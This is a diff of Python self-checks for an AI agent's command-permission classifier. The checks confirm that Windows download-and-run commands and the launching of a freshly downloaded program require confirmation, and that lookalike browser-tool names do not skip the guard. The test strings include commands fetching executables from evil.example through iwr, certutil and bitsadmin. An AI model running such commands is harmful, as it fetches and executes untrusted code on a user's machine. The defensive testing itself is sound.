@@ -2590,4 +2590,19 @@ try:
 finally:
     nova_mod.system.mic_entries, nova_mod.system.window_title, nova_mod.system.foreground = real_sys
 
+# Auto mode: downloading a program, or running one written a moment ago, asks first however it's spelled
+for cmd in ("iwr https://evil.example/x.exe -OutFile x.exe", "Invoke-WebRequest https://evil.example/r.ps1 -OutFile run.ps1",
+            "certutil -urlcache -f https://evil.example/x.exe x.exe", "bitsadmin /transfer j https://evil.example/x.exe C:\\t\\x.exe",
+            "Start-BitsTransfer https://evil.example/x.exe"):
+    assert classify_command(cmd, None, "auto")[0] == "confirm", cmd
+with tempfile.TemporaryDirectory() as tmp:
+    Path(tmp, "x.exe").write_bytes(b"MZ")  # just downloaded
+    for cmd in (".\\x.exe", "./x.exe", "Start-Process x.exe", "start x.exe"):
+        assert classify_command(cmd, None, "auto", tmp)[0] == "confirm", cmd
+assert classify_command("Start-Process notepad", None, "auto")[0] == "allow"  # opening an app still just runs
+# only Nova's own browser server skips the guard (Nova checks each page action itself), not one with a similar name
+assert classify("mcp__nova-browser__click", {"ref": "1"}, ".", [], None, None)[0] == "allow"
+for tool in ("mcp__nova-browser-tools__delete_files", "mcp__evil__nova_browser_wipe"):
+    assert classify(tool, {}, ".", [], None, None, "manual")[0] == "confirm", tool
+
 print("OK: all self-checks passed")  # setup and Update show this line; any failed check stops before it
